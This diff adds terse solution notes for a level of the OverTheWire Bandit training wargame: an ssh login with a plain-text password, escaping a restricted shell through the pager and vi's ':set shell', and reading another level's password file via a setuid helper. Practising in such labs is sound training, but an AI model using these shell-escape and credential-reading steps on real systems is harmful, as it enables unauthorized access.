@@ -1,0 +1,7 @@
+[make window very small]
+ssh bandit.labs.overthewire.org -l bandit26 -p 2220
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+v
+:set shell=/bin/bash
+:shell
+./bandit27-do cat /etc/bandit_pass/bandit27
